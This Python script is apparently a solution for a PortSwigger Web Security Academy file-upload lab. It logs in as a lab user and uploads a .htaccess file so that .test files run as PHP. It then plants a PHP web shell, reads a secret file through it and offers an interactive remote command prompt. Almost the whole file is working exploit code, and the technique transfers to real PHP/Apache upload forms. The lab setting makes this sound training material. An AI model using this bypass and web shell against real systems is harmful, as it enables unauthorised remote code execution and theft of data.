import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = f"""
╔════════════════════════════════════════════════════════════════╗
║          FILE UPLOAD VULNERABILITIES LABS                  	 ║
╠════════════════════════════════════════════════════════════════╣
║   Lab 04 : Web shell upload via extension blacklist bypass	 ║
╠════════════════════════════════════════════════════════════════╣
║        PortSwigger Web Security Academy                    	 ║
╚════════════════════════════════════════════════════════════════╝
"""

session = requests.Session()

is_web_shell_exists = False

proxies = {
	"http" : "http://127.0.0.1:8080",
	"https" : "http://127.0.0.1:8080"
}

def run_command(url):
	response6 = requests.get(url=url + "/files/avatars/shell.test?cmd=cat /home/carlos/secret",verify=False)
	print(f"[+] Secret is : {response6.text.strip()}")
	prompt=get_prompt(url)
	print(f"[+] Enter command you want to execute")
	print(f"[+] Type exit to stop")
	while True:
		command = input(prompt)
		path4 = url + "/files/avatars/shell.test?cmd=" + command
		if command == 'exit':
			sys.exit(0)
		if command == 'rm shell.test':
			response4 = requests.get(url=path4,verify=False)
			print(f"[+] Web Shell Removed")
			sys.exit(0)
		response4 = requests.get(url=path4,verify=False)
		if response4.status_code == 200:
			print(response4.text.strip())


def get_prompt(url):
	username = requests.get(url=url+"/files/avatars/shell.test?cmd=whoami").text.strip()
	hostname = requests.get(url=url+"/files/avatars/shell.test?cmd=hostname").text.strip()
	working_dir = requests.get(url=url+"/files/avatars/shell.test?cmd=pwd").text.strip()
	prompt = f"{username}@{hostname} : {working_dir}$ "
	return(prompt)


def web_shell(url):
	path5= '/my-account'
	path3 = '/my-account/avatar'
	csrf = csrf_token(url,path5)
	files = {
		"avatar":(
			"shell.test",
			"<?php system($_GET['cmd']); ?>",
			"application/x-php"
		)
	}
	data = {
	"user" : "wiener",
	"csrf" : csrf
	}
	response2=session.post(url=url+path3,files=files,data=data,verify=False)
	print(f"[+] Uploading a web shell ...")
	if "The file avatars/shell.test has been uploaded" in response2.text:
		print(f"[+] Web Shell Uploaded Succesfully")
		run_command(url)
	else :
		print(f"[-] Web Shell Upload Failed" )
		sys.exit(1)


def login(url):
	path1 = '/login'
	csrf=csrf_token(url,path1)
	creads = {
		"csrf" : csrf,
		"username":"wiener",
		"password" : "peter"
	}
	print(f"[+] Login as wiener:peter")
	response6= session.post(url=url+path1,data=creads,verify=False)
	if "Log out" in response6.text: 
		print(f"[+] Login Successfull")
		upload_htacces(url)
	else:
		print(f"[-] Login Failed")
		sys.exit(0)


def csrf_token(url,path):
	response1 = session.get(url=url+path,verify=False)
	soup = BeautifulSoup(response1.text,"html.parser")
	if not soup.find("input",{"name":"csrf"}):
		print(f"[-] CSRF token not found")
		sys.exit(0)
	else:	
		csrf = soup.find("input",{"name":"csrf"})["value"]
		return(csrf)


def upload_htacces(url):
	path5= '/my-account'
	path3 = '/my-account/avatar'
	csrf = csrf_token(url,path5)
	files = {
		"avatar":(
			".htaccess",
			"AddType application/x-httpd-php .test",
			"text/plain"
		)
	}
	data = {
	"user" : "wiener",
	"csrf" : csrf
	}
	response6=session.post(url=url+path3,files=files,data=data,verify=False)
	print(f"[+] Uploading .htaccess file")
	if "The file avatars/.htaccess has been uploaded" in response6.text:
			print(f"[+] .htacess file uploaded successfully")
			if is_web_shell_exists == True:
				run_command(url)
			else:
				web_shell(url)
	else:
		print(f"[-] .htaccess file upload failed")
		print(response6.status_code)
		print(response6.text)
		sys.exit(0)


def check_webshell(url):
	global is_web_shell_exists
	path2 = '/files/avatars/shell.test'
	response5 = requests.get(url=url+path2,verify=False)
	if response5.status_code == 200:
		print(f"[+] Web shell already exists")
		is_web_shell_exists= True
	login(url)


def main():
	if len(sys.argv) != 2:
		print(f"[+] Usage : {sys.argv[0]} <url>")
		print(f"[+] Example : {sys.argv[0]} https://00000.web-security-academy.net")
		sys.exit(1)
	else:
		print(banner)
	if sys.argv[1].endswith("/"):
		url = sys.argv[1][:-1]
	else:
		url = sys.argv[1]
	check_webshell(url)


if __name__ == "__main__":
	main()
